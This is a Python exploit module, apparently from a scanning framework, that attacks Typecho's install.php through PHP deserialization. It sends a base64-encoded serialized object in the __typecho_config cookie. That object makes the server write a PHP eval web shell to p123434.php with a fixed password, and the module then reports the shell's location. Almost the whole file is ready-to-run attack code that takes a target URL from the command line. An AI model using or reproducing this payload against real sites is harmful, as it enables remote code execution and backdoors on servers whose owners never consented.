#coding: utf-8

import os
import sys
import datetime
import re
from exp_template import Exploit, Level, session, get_random_password

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""
class typecho_install_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'typecho_install_getshell',
            'author': 'x',
            'date': '2018-02-29',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'typecho',
            'min_version': '1.5',
            'max_version': '3.2',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Typecho install.php 反序列化导致任意代码执行',
            'reference':'Typecho install.php 反序列化导致任意代码执行.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
    	headers={
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
            'Connection':'keep-alive',
            'Cache-Control':'max-age=0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
            'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Cookie':'__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6Njg6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMTIzNDM0LnBocCcsICc8P3BocCBAZXZhbCgkX1BPU1RbbHM0MjM0MzRdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9',
            'Accept-Encoding':'gzip, deflate',
            'Referer':self.url+"/install.php"
            }
        url=self.url+"/install.php?finish=1"
        try:
            req = session()
            r=req.get(url=url, headers=headers)
            if r.status_code == 500:
            	self.shell_info(self.url+"/p123434.php", 'ls423434', 'php')
            else:
            	return
        except:
            self.report('目标连接失败', Level.error)
            return
        		
if __name__ == "__main__":
    # url = 'http://localhost:93/build/'
    # a = typecho_install_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = typecho_install_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

